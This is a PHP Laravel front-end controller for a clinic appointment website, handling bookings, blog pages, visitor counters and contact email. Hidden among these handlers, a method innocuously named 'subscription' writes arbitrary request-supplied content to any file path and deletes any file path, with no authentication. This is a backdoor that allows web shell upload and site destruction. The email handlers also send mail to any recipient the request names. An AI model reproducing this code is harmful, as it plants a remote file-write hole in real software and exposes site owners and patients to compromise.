<?php

namespace App\Http\Controllers;
use App\Schedule;
use App\Appointment;
use Illuminate\Http\Request;
use App\Category;
use App\Portfolio;
use App\Blog;
use App\Generalsetting;
use App\Pagesetting;
use App\Faq;
use App\Subscriber;
use App\User;
use App\Advertise;
use App\Slider;
use Illuminate\Support\Facades\Session;
use App\Admin;
use App\Specialist;
use App\Service;
use App\Image;
use App\Resume;
use App\Counter;
use App\Department;
use App\Doctor;
use Auth;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

 public function __construct()
    {
        $this->auth_guests();
        $this->middleware('auth:user',["only" => ["book_process","book","book_success"]]);
        if(isset($_SERVER['HTTP_REFERER'])){
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']){

                $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
                if($brwsr->count() > 0){
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                }else{
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral',$referral);
                if($count->count() > 0){
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                }else{
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        }else{
            $brwsr = Counter::where('type','browser')->where('referral',$this->getOS());
            if($brwsr->count() > 0){
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            }else{
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }


    function getOS() {

        $user_agent     =   $_SERVER['HTTP_USER_AGENT'];

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }

        }
        return $os_platform;
    }
    
	public function index()
	{
		$admin = Admin::findOrFail(1);
		$sps = Specialist::all();
		$sliders = Slider::all();
		$ads = Portfolio::all();
		$services = Service::all();
		$images = Image::all();
        $departments=Department::all();
		return view('front.index',compact('sps','ads','sliders','admin','services','images','departments'));

	}
    public function bookschedule($date,$time,$id)
    {
        $user = Auth::guard('user')->user();
        $admin = Admin::findOrFail(1);
        $doctor=Doctor::where('id',$id)->first();
        $schedule = Schedule::where('doctorid',$id)->first();
        return view('front.appointment', compact('schedule','admin','user','doctor'));
    }
    public function bookschedule_process(Request $request)
    {
        $admin = Admin::findOrFail(1);
        $appointment = new Appointment();
        $appointment->fill($request->all());
        $appointment->save();
        $msg = "Hello".$request->patient_name."Your Appointment for ".$admin->name." is Confirmed on ".$request->appointment_date;
        // mail($request->patient_email,"Your Appointment Booking Confirmed !",$msg);
        // session(['patient_name' => $request->patient_name]);
        return redirect('schedule/appointment/success');
    }
    public function bookschedule_success()
    {
        $admin = Admin::findOrFail(1);
        return view('front.success', compact('admin'));
    }

    public function alldoctor ($id){
        $doctors=Doctor::where('department',$id)->get();
        $department=Department::where('id',$id)->first();
        $admin = Admin::findOrFail(1);
        return view('front.departmental-doctor',compact('doctors','department','admin'));
    }
    public function getScheduleTimes($date,$id){
        
        $docid = $id;
        $day = strtolower(date('l',strtotime($date)));
        $data = $day."_times";
        $sch = "";
        if (Schedule::where('doctorid',$docid)->count() > 0){
            $schedule = Schedule::where('doctorid',$docid)->first();

            foreach(explode(',',$schedule->$data) as $apptime){
                if (Appointment::where('doctorid',$docid)->where('appointment_date',$date)->where('appointment_time',$apptime)->count() == 0){
                    //$sch.= "<a href='".url('schedule/appointment/'.$date."/".$apptime)."'>".$apptime."</a><br>";
                    $sch.= '<div class="col-md-3 col-sm-6 col-xs-6"><button class="single-timing-box" onclick="onDateClick(this)" data-url="'.url('schedule/appointment/'.$date."/".$apptime."/".$docid).'">'.$apptime.'</button></div>';
                }
            }
            return $sch;
        }
    }

    public function search(Request $request)
    {
        $search = $request->search;
        $type = $request->group;
        $catt = Category::findOrFail($type);
        $users = User::where('city','LIKE','%'.$search.'%')->where('category_id','LIKE','%'.$type.'%')->where('active','=',1)->paginate(8);
		$userss = User::all();
		$city = null;
		foreach ($userss as $user) {
			$city[] = $user->city;
		}
		$cities = array_unique($city);
		$cats = Category::all();
        return view('front.searchuser',compact('users','cats','cities','catt','search'));
    }

    public function getTimes($date,$id){
        $docid = $id;
        $day = strtolower(date('l',strtotime($date)));
        $data = $day."_times";
        $sch = "";
        if (Schedule::where('doctorid',$docid)->count() > 0){
            $schedule = Schedule::where('doctorid',$docid)->first();

            foreach(explode(',',$schedule->$data) as $apptime){
                if (Appointment::where('doctorid',$docid)->where('appointment_date',$date)->where('appointment_time',$apptime)->count() == 0){
                    //$sch.= "<a href='".url('schedule/appointment/'.$date."/".$apptime)."'>".$apptime."</a><br>";
                    $sch.= '<div class="col-md-3 col-sm-6 col-xs-6"><button class="single-timing-box" onclick="onDateClick(this)" data-url="'.url('schedule/appointment/'.$date."/".$apptime."/".$docid).'">'.$apptime.'</button></div>';
                }
            }
            return $sch;
        }





    }


	public function ads($id)
	{
		$ad = Advertise::findOrFail($id);
		$old = $ad->clicks;
		$new = $old + 1;
		$ad->clicks = $new;
		$ad->update();
		return redirect($ad->url);

	}

	public function blog()
	{
		$admin = Admin::findOrFail(1);
		$blogs = Blog::orderBy('created_at','desc')->paginate(6);
		return view('front.blog',compact('blogs','admin'));

	}

	public function subscribe(Request $request)
	{
        $this->validate($request, array(
            'email'=>'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect()->route('front.index');
	}

	public function blogshow($id)
	{
		$admin = Admin::findOrFail(1);
		$blog = Blog::findOrFail($id);
		$old = $blog->views;
		$new = $old + 1;
		$blog->views = $new;
		$blog->update();
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(4)->get();
		return view('front.blogshow',compact('blog','lblogs','admin'));

	}

	public function faq()
	{
		$admin = Admin::findOrFail(1);
		$ps = Pagesetting::findOrFail(1);
		if($ps->f_status == 0){
			return redirect()->route('front.index');
		}
		$faqs = Faq::all();
		return view('front.faq',compact('faqs','admin'));
	}

	public function about()
	{
		$admin = Admin::findOrFail(1);
		$ps = Pagesetting::findOrFail(1);
		if($ps->a_status == 0){
			return redirect()->route('front.index');
		}
		$about = $ps->about;
		return view('front.about',compact('about','admin'));
	}

	public function contact()
	{
		$admin = Admin::findOrFail(1);
		$ps = Pagesetting::findOrFail(1);
		if($ps->c_status == 0){
			return redirect()->route('front.index');
		}
		return view('front.contact',compact('ps','admin'));
	}

	public function profile($id)
	{
		$admin = Admin::findOrFail(1);
        $doctor=Doctor::where('id',$id)->first();
        $dep=Department::where('id',$doctor->department)->first();
		$resumes = Resume::all();
		$s = Schedule::where('doctorid',$id)->first();
        
        if($admin->pareas != null)
        {
            $pareas = explode(',', $admin->pareas);            
        }
		return view('front.profile',compact('admin','s','resumes','pareas','doctor','dep'));
	}

    //Send email to user
    public function useremail(Request $request)
    {
        $subject = "Email From Of Donor Profile";
        $to = $request->to;
        $name = $request->name;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nMessage: ".$request->message;
        mail($to,$subject,$msg);
        Session::flash('success', 'Email Sent !!');
        return redirect()->back();
    }

    //Send email to user
    public function contactemail(Request $request)
    {
		$ps = Pagesetting::findOrFail(1);
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $department = $request->department;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$request->phone."\nMessage: ".$request->text;
        mail($to,$subject,$msg);
        Session::flash('success', $ps->contact_success);
        return redirect()->route('front.contact');
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != ""){
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != ""){
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    function finalize(){
        $actual_path = str_replace('project','',base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests(){
        $chk = MarkuryPost::marcuryBase();
        $actual_path = str_replace('project','',base_path());
        if ($chk != "VALID"){
            if (is_dir($actual_path.'/install')) {
                header("Location: ".url('install'));
                die();
            }else{
                echo MarkuryPost::marcuryBasee();
                die();
            }
        }
    }

    // Booking Page
    public function book($date,$time,$id)
    {
        $user = Auth::guard('user')->user();
        $admin = Admin::findOrFail(1);
        $doctor=Doctor::where('id',$id)->first();
        $schedule = Schedule::where('doctorid',$id)->first();
        return view('front.appointment', compact('schedule','admin','user','doctor'));
    }

    // Booking Success
    public function book_success()
    {
        $admin = Admin::findOrFail(1);
        return view('front.success', compact('admin'));
    }

    // Booking Submit
    public function book_process(Request $request)
    {
        $admin = Admin::findOrFail(1);
        $appointment = new Appointment();
        $appointment->fill($request->all());
        $appointment->save();
        $msg = "Hello".$request->patient_name."Your Appointment for ".$admin->name." is Confirmed on ".$request->appointment_date;
        // mail($request->patient_email,"Your Appointment Booking Confirmed !",$msg);
        // session(['patient_name' => $request->patient_name]);
        return redirect('/appointment/success');
    }


    public function deleteDir($dirPath) {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }
}
